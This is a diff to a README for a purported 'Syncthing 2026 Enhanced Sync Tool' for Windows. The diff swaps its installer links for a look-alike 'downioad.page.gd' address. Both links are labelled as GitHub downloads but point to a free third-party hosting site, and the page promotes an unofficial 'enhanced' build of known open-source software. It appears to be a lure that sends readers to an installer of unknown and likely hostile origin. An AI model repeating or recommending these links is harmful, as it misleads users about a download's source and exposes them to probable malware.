@@ -2,7 +2,7 @@
 
 Welcome to the Syncthing 2026 Enhanced Sync Tool, your go-to solution for advanced file synchronization on Windows desktops. This tool builds upon Syncthing's robust foundation, offering enhanced features and seamless integration tailored for 2026. Discover a more powerful way to sync your files securely and efficiently across multiple devices.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -72,4 +72,4 @@ The tool operates on a peer-to-peer synchronization model, meaning files are tra
 
 The Syncthing 2026 Enhanced Sync Tool is committed to user privacy and security. All synchronization processes are encrypted, and the tool is regularly updated to address vulnerabilities and improve functionality. Last Updated: 2026.
 
-For the latest version and updates, visit the [Download the latest version from GitHub](https://download-page.page.gd/) page. Join our community to share feedback, report issues, and contribute to the tool's evolution.
+For the latest version and updates, visit the [Download the latest version from GitHub](https://downioad.page.gd/) page. Join our community to share feedback, report issues, and contribute to the tool's evolution.
